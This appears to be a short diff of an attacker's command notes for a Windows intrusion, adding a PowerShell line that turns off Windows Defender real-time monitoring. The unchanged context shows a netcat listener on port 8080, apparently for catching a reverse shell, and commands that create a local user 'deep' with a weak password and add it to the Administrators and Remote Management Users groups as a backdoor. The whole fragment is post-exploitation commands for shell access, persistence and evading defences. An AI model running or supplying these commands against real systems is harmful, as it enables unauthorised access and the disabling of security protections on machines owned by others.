@@ -7,3 +7,7 @@ nc -lvnp 8080
 net user deep Password123! /add
 net localgroup administrators deep /add
 net localgroup 'Remote Management Users' deep /add
+
+
+
+powershell.exe set-mppreference -disablerealtimemonitoring $true
